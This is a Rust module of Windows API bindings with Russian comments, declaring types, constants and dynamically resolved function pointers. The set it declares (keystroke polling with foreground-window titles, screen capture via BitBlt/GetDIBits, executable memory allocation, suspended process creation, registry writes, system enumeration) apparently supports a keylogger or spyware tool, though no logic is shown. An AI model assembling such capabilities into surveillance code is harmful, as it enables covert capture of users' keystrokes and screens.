//! Типы и константы Windows API

use core::ffi::c_void;

// Базовые типы Windows
pub type HANDLE = *mut c_void;
pub type HMODULE = *mut c_void;
pub type HWND = *mut c_void;
pub type HDC = *mut c_void;
pub type HBITMAP = *mut c_void;
pub type HGDIOBJ = *mut c_void;
pub type HKEY = *mut c_void;
pub type BOOL = i32;
pub type DWORD = u32;
pub type WORD = u16;
pub type BYTE = u8;
pub type LONG = i32;
pub type UINT = u32;
pub type LPVOID = *mut c_void;
pub type LPCVOID = *const c_void;

// Константы
pub const NULL: *mut c_void = core::ptr::null_mut();
pub const TRUE: BOOL = 1;
pub const FALSE: BOOL = 0;
pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;

// Memory
pub const MEM_COMMIT: DWORD = 0x1000;
pub const MEM_RESERVE: DWORD = 0x2000;
pub const MEM_RELEASE: DWORD = 0x8000;
pub const PAGE_READWRITE: DWORD = 0x04;
pub const PAGE_EXECUTE_READ: DWORD = 0x20;
pub const PAGE_EXECUTE_READWRITE: DWORD = 0x40;

// GDI
pub const SM_CXSCREEN: i32 = 0;
pub const SM_CYSCREEN: i32 = 1;
pub const SRCCOPY: DWORD = 0x00CC0020;
pub const DIB_RGB_COLORS: DWORD = 0;
pub const BI_RGB: DWORD = 0;

// Registry
pub const HKEY_CURRENT_USER: usize = 0x80000001;
pub const HKEY_LOCAL_MACHINE: usize = 0x80000002;
pub const KEY_READ: DWORD = 0x20019;
pub const KEY_WRITE: DWORD = 0x20006;
pub const KEY_SET_VALUE: DWORD = 0x0002;
pub const REG_SZ: DWORD = 1;
pub const REG_DWORD: DWORD = 4;

// File
pub const GENERIC_READ: DWORD = 0x80000000;
pub const GENERIC_WRITE: DWORD = 0x40000000;
pub const CREATE_ALWAYS: DWORD = 2;
pub const OPEN_EXISTING: DWORD = 3;
pub const FILE_ATTRIBUTE_NORMAL: DWORD = 0x80;

// Process
pub const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
pub const CREATE_NO_WINDOW: DWORD = 0x08000000;
pub const CREATE_SUSPENDED: DWORD = 0x00000004;

// Drive types
pub const DRIVE_UNKNOWN: DWORD = 0;
pub const DRIVE_NO_ROOT_DIR: DWORD = 1;
pub const DRIVE_REMOVABLE: DWORD = 2;
pub const DRIVE_FIXED: DWORD = 3;
pub const DRIVE_REMOTE: DWORD = 4;
pub const DRIVE_CDROM: DWORD = 5;
pub const DRIVE_RAMDISK: DWORD = 6;

// Network
pub const AF_UNSPEC: DWORD = 0;
pub const AF_INET: WORD = 2;
pub const AF_INET6: WORD = 23;
pub const GAA_FLAG_INCLUDE_PREFIX: DWORD = 0x10;

// NtStatus
pub const STATUS_SUCCESS: i32 = 0;
pub const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;

// SystemInformationClass
pub const SYSTEM_BASIC_INFORMATION: DWORD = 0;
pub const SYSTEM_PERFORMANCE_INFORMATION: DWORD = 2;
pub const SYSTEM_TIMEOFDAY_INFORMATION: DWORD = 3;
pub const SYSTEM_PROCESS_INFORMATION: DWORD = 5;

// Типы функций
pub type LoadLibraryAFn = unsafe extern "system" fn(*const u8) -> HMODULE;
pub type GetProcAddressFn = unsafe extern "system" fn(HMODULE, *const u8) -> *mut c_void;
pub type VirtualAllocFn = unsafe extern "system" fn(LPVOID, usize, DWORD, DWORD) -> LPVOID;
pub type VirtualFreeFn = unsafe extern "system" fn(LPVOID, usize, DWORD) -> BOOL;
pub type VirtualProtectFn = unsafe extern "system" fn(LPVOID, usize, DWORD, *mut DWORD) -> BOOL;
pub type CloseHandleFn = unsafe extern "system" fn(HANDLE) -> BOOL;
pub type SleepFn = unsafe extern "system" fn(DWORD);
pub type GetLastErrorFn = unsafe extern "system" fn() -> DWORD;
pub type NtQuerySystemInformationFn = unsafe extern "system" fn(DWORD, LPVOID, DWORD, *mut DWORD) -> i32;
pub type GetLogicalDrivesFn = unsafe extern "system" fn() -> DWORD;
pub type GetDriveTypeWFn = unsafe extern "system" fn(*const u16) -> DWORD;
pub type GetDiskFreeSpaceExWFn = unsafe extern "system" fn(*const u16, *mut u64, *mut u64, *mut u64) -> BOOL;
pub type GetAdaptersAddressesFn = unsafe extern "system" fn(DWORD, DWORD, LPVOID, LPVOID, *mut DWORD) -> DWORD;

// User32
pub type GetDCFn = unsafe extern "system" fn(HWND) -> HDC;
pub type ReleaseDCFn = unsafe extern "system" fn(HWND, HDC) -> i32;
pub type GetSystemMetricsFn = unsafe extern "system" fn(i32) -> i32;
pub type GetAsyncKeyStateFn = unsafe extern "system" fn(i32) -> i16;
pub type GetForegroundWindowFn = unsafe extern "system" fn() -> HWND;
pub type GetWindowTextAFn = unsafe extern "system" fn(HWND, *mut u8, i32) -> i32;

// GDI32
pub type CreateCompatibleDCFn = unsafe extern "system" fn(HDC) -> HDC;
pub type CreateCompatibleBitmapFn = unsafe extern "system" fn(HDC, i32, i32) -> HBITMAP;
pub type SelectObjectFn = unsafe extern "system" fn(HDC, HGDIOBJ) -> HGDIOBJ;
pub type BitBltFn = unsafe extern "system" fn(HDC, i32, i32, i32, i32, HDC, i32, i32, DWORD) -> BOOL;
pub type GetDIBitsFn = unsafe extern "system" fn(HDC, HBITMAP, UINT, UINT, LPVOID, *mut BitmapInfoHeader, UINT) -> i32;
pub type DeleteObjectFn = unsafe extern "system" fn(HGDIOBJ) -> BOOL;
pub type DeleteDCFn = unsafe extern "system" fn(HDC) -> BOOL;

/// BITMAPINFOHEADER
#[repr(C)]
pub struct BitmapInfoHeader {
    pub bi_size: u32,
    pub bi_width: i32,
    pub bi_height: i32,
    pub bi_planes: u16,
    pub bi_bit_count: u16,
    pub bi_compression: u32,
    pub bi_size_image: u32,
    pub bi_x_pels_per_meter: i32,
    pub bi_y_pels_per_meter: i32,
    pub bi_clr_used: u32,
    pub bi_clr_important: u32,
}

impl BitmapInfoHeader {
    pub const fn new() -> Self {
        Self {
            bi_size: 40,
            bi_width: 0,
            bi_height: 0,
            bi_planes: 1,
            bi_bit_count: 24,
            bi_compression: BI_RGB,
            bi_size_image: 0,
            bi_x_pels_per_meter: 0,
            bi_y_pels_per_meter: 0,
            bi_clr_used: 0,
            bi_clr_important: 0,
        }
    }
}

/// UNICODE_STRING
#[repr(C)]
pub struct UnicodeString {
    pub length: u16,
    pub maximum_length: u16,
    pub buffer: *mut u16,
}

/// SYSTEM_PROCESS_INFORMATION (частичная)
#[repr(C)]
pub struct SystemProcessInformation {
    pub next_entry_offset: u32,
    pub number_of_threads: u32,
    pub working_set_private_size: i64,
    pub hard_fault_count: u32,
    pub number_of_threads_high_watermark: u32,
    pub cycle_time: u64,
    pub create_time: i64,
    pub user_time: i64,
    pub kernel_time: i64,
    pub image_name: UnicodeString,
    pub base_priority: i32,
    pub unique_process_id: usize,
    pub inherited_from_unique_process_id: usize,
}
